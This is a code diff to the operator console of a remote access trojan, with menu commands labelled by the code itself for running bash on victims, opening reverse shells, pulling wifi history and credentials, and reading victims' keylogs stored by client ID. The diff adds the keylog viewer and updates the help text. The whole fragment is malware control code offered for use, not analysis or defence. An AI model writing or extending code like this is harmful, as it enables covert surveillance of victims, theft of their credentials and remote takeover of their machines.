@@ -6,9 +6,6 @@ import main_db
 import platform
 import shutil
 
-### TO DO:
-### THREADED FUNCTION LOOK FOR NEW USERS IN REALTIME AND UPDATE TO HUDS
-
 ### READ SERVER_CONFIG.CFG TO GET IP AND PORT ###
 with open("./server.cfg", "r") as cfg:
     ip = '{0}'.format(cfg.readline()[7:].strip())
@@ -16,8 +13,6 @@ with open("./server.cfg", "r") as cfg:
 
 if platform.uname()[0] == "Linux":
     _OS = "linux"
-
-
 
 print("""
   _____            _         _             
@@ -81,7 +76,10 @@ while 1:
 /command  #runs a bash command \n
 /rshell   #attempts a reverse shell\n
 /rshell_show # shows whats server the targets reverse shell wants to connect too.\n
-/reboot    #attempts to send all creds if havent already \n'''.format(RAT_IP))
+/getwifi    # shows wifi history.\n
+/getkeylog  # shows keylogs. \n
+/reboot \n'''.format(RAT_IP))
+
         while 1:
                 print('---------Enter command')
                 command = input()
@@ -105,14 +103,23 @@ while 1:
 
                 elif command == '/getwifi':
                     print(main_db.get_user_wifi_names(CLEINT_UUID))
+                
+                elif command == '/getkeylog':
+                    for logs in main_db.get_user_keylog(CLEINT_UUID):
+                        print(logs)
+
+                elif command == 'back':
+                    pass
 
                 elif command == '/help':
                     print('''
 
 /command  #runs a bash command 
-/rshell   #attempts a reverse shell
-/reboot    #attempts to send all creds if havent already
-/script
+/rshell   #attempts a reverse shell \n
+/keylogger \n
+/getwifi \n
+/reboot \n
+/script \n 
 /help''')
 
     if MAIN_INPUT.lower() == '/create_link':
